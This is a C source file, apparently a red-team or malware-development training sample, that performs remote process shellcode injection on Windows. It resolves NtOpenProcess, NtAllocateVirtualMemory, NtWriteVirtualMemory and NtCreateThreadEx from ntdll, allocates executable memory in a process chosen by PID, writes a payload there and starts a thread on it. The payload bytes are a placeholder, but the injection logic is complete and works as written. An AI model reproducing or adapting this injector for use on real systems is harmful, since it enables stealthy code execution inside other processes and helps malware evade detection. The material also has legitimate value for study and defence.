#include <windows.h>
#include <stdio.h>

#pragma comment (lib, "ntdll")
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)

/* define some necessary kernel structures */
typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG              Length;
	HANDLE             RootDirectory;
	PUNICODE_STRING    ObjectName;
	ULONG              Attributes;
	PVOID              SecurityDescriptor;
	PVOID              SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
	PVOID              UniqueProcess;
	PVOID              UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

/* create function prototypes for NT API */
typedef NTSTATUS(NTAPI* pNtOpenProcess) (
	PHANDLE              ProcessHandle,
	ACCESS_MASK          AccessMask,
	POBJECT_ATTRIBUTES   ObjectAttributes,
	PCLIENT_ID           ClientID
);

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory) (
	HANDLE               ProcessHandle,
	PVOID*               BaseAddress,
	ULONG                ZeroBits,
	PSIZE_T		     RegionSize, /* changed this to the member shown in https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory */
	ULONG                AllocationType,
	ULONG                Protect
);

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory) (
	HANDLE               ProcessHandle,
	PVOID                BaseAddress,
	PVOID                Buffer,
	ULONG                NumberOfBytesToWrite,
	PULONG               NumberOfBytesWritten
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx) (
	PHANDLE				hThread,
	ACCESS_MASK			DesiredAccess,
	PVOID				ObjectAttributes,
	HANDLE				ProcessHandle,
	PVOID				lpStartAddress,
	PVOID				lpParameter,
	ULONG				Flags,
	SIZE_T				StackZeroBits,
	SIZE_T				SizeOfStackCommit,
	SIZE_T				SizeOfStackReserve,
	PVOID				lpBytesBuffer
);

int main(int argc, char* argv[]) {

	NTSTATUS status;
	PVOID rBuffer = NULL;
	HMODULE hNTDLL = NULL;
	HANDLE hProcess = NULL, hThread = NULL;

	unsigned char crowPuke[] =
		"\xDE\xAD\xBE\xEF";

	size_t crowPukeSize = sizeof(crowPuke), bytesWritten = NULL;
	
	if (argc < 2) {
		warn("usage: %s <PID>", argv[0]);
		return EXIT_FAILURE;
	}

	/* initialize the _CLIENT_ID & _OBJECT_ATTRIBUTES kernel structures */
	CLIENT_ID CID = { (HANDLE)atoi(argv[1]), NULL };
	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
	
	/* get a handle to NTDLL */
	info("trying to get a handle to NTDLL");
	hNTDLL = GetModuleHandleW(L"ntdll");

	if (hNTDLL == NULL) {
		warn("failed to get handle to NTDLL, error: %ld", GetLastError());
		return EXIT_FAILURE;
	}

	okay("got handle to NTDLL\n\\---0x%p", hNTDLL);
	info("populating function prototypes");

	/* create NTAPI functions from prototypes + populate them with their respective addresses from NTDLL */
	pNtOpenProcess kawNtOpenProcess = (pNtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
	pNtAllocateVirtualMemory kawNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
	pNtWriteVirtualMemory kawNtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
	pNtCreateThreadEx kawNtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");

	okay("created function: kawNtOpenProcess\n\\---0x%p [ntdll!NtOpenProcess]", &kawNtOpenProcess);
	okay("created function: kawNtAllocateVirtualMemory\n\\---0x%p [ntdll!NtAllocateVirtualMemory]", &kawNtAllocateVirtualMemory);
	okay("created function: kawNtWriteVirtualMemory\n\\---0x%p [ntdll!NtWriteVirtualMemory]", &kawNtWriteVirtualMemory);
	okay("created function: kawNtCreateThreadEx\n\\---0x%p [ntdll!NtCreateThreadEx]", &kawNtCreateThreadEx);

	/* begin injection */
	info("trying to get a handle to process (%d)", (int)(uintptr_t)CID.UniqueProcess);
	status = kawNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);

	/* if the PID doesn't exist, it gets returned as (0), setup some error handling*/
	if (status != STATUS_SUCCESS) {
		warn("failed to get handle to process (%d), error: 0x%x", (int)(uintptr_t)CID.UniqueProcess, status);
		return EXIT_FAILURE;
	}

	/* ain't no way in hell I'm writing "CID.UniqueProcess" that many times, nu-uh, get the PID from the valid handle we get @ this point */
	DWORD PID = GetProcessId(hProcess);
	okay("got handle to process (%ld)\n\\---0x%p", PID, hProcess);

	status = kawNtAllocateVirtualMemory(hProcess, &rBuffer, NULL, &crowPukeSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	okay("created buffer of %zu-bytes w/ PAGE_EXECUTE_READWRITE permissions", sizeof(crowPuke));

	status = kawNtWriteVirtualMemory(hProcess, rBuffer, crowPuke, sizeof(crowPuke), (PULONG)&bytesWritten);
	okay("wrote %zu-bytes in the process memory", bytesWritten);

	status = kawNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, rBuffer, NULL, 0, 0, 0, 0, NULL);

	if (status != STATUS_SUCCESS) {
		warn("kawNtCreateThreadEx couldn't create a new thread, error: 0x%x", status);
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	okay("created thread in target process!");
	info("waiting for thread to complete execution");

	WaitForSingleObject(hThread, INFINITE);
	okay("thread finished executing, cleaning up");

	CloseHandle(hThread);
	CloseHandle(hProcess);
	okay("done! see you next time :>");

	return EXIT_SUCCESS;

}
